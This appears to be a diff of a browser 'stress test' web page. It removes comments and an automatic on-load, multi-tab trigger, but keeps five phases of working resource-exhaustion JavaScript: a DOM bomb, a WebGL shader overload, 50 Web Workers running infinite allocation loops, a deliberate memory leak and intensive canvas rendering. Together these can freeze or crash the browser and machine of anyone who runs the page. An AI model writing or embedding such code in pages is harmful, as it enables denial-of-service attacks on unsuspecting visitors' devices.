@@ -29,22 +29,6 @@
     log.innerText = message;
   }
 
-  // Check if all tabs are open and ready
-  function checkAllTabsReady() {
-    // Use localStorage to share state between tabs
-    const openedTabs = parseInt(localStorage.getItem('openedTabs') || '0');
-    const totalTabs = 10;  // Number of tabs expected to open
-
-    if (openedTabs < totalTabs) {
-      localStorage.setItem('openedTabs', openedTabs + 1);
-      setTimeout(checkAllTabsReady, 1000);  // Check again in 1 second
-    } else {
-      // All tabs are ready, start the stress test
-      setTimeout(startStressTest, 3000);  // 3-second delay before starting the stress test
-    }
-  }
-
-  // 🌋 Phase 1: DOM Bomb
   function DOMBomb() {
     updateLog("Starting DOM Bomb...");
     for (let i = 0; i < 5000; i++) { // Start with 5000 DOM elements
@@ -58,8 +42,6 @@
       document.body.appendChild(div);
     }
   }
-
-  // 🌋 Phase 2: WebGL Fragment Shader Overload
   function WebGLFragmentShader() {
     updateLog("Starting WebGL Fragment Shader...");
     const canvas = document.createElement('canvas');
@@ -108,15 +90,13 @@
     render(0);
     document.body.appendChild(canvas);
   }
-
-  // 🌋 Phase 3: Launch Workers Gradually
   function launchWorkers(num) {
     updateLog("Starting Workers...");
     const code = `
         while (true) {
             let load = [];
-            for (let i = 0; i < 5000; i++) { // Start with 5000 iterations
-                load.push(new Array(5000).fill(Math.random())); // Each array is bigger
+            for (let i = 0; i < 5000; i++) {
+                load.push(new Array(5000).fill(Math.random()));
             }
         }
     `;
@@ -126,16 +106,12 @@
       new Worker(url);
     }
   }
-
-  // 🌋 Phase 4: Gradual Memory Leak
   function MemoryLeak() {
     updateLog("Starting Memory Leak...");
     setInterval(() => {
-        memoryLeak.push(new Array(1000000).fill(Math.random())); // Larger arrays for leak
-    }, 1000);  // Slower leak rate to prevent instant overload
+        memoryLeak.push(new Array(1000000).fill(Math.random()));
+    }, 1000);
   }
-
-  // 🌋 Phase 5: Canvas Rendering
   function IntensiveCanvasRendering() {
     updateLog("Starting Intensive Canvas Rendering...");
     const canvas = document.createElement('canvas');
@@ -152,18 +128,13 @@
     render();
   }
 
-  // 🌋 Start Gradual Overload
   function startStressTest() {
-    // Start phases one by one with delays
-    setTimeout(() => DOMBomb(), 500);  // Delay for DOMBomb
-    setTimeout(() => WebGLFragmentShader(), 2000);  // Delay for WebGL
-    setTimeout(() => launchWorkers(50), 5000);  // Delay for workers
-    setTimeout(() => MemoryLeak(), 8000);  // Delay for memory leak
-    setTimeout(() => IntensiveCanvasRendering(), 12000);  // Delay for canvas rendering
+    setTimeout(() => DOMBomb(), 500); 
+    setTimeout(() => WebGLFragmentShader(), 2000); 
+    setTimeout(() => launchWorkers(50), 5000);
+    setTimeout(() => MemoryLeak(), 8000);
+    setTimeout(() => IntensiveCanvasRendering(), 12000);
   }
-
-  // Start the tab checking process
-  checkAllTabsReady();  // Start the checking process when the page loads
 </script>
 </body>
 </html>
